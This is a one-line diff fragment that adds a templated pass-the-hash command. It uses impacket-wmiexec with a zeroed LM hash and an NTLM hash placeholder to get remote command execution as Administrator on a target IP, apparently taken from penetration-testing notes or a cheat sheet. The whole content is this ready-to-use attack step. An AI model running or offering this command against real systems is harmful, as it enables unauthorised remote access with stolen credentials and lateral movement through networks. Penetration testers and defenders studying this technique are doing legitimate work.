@@ -1,0 +1,1 @@
+impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM-hash> Administrator@<IP>
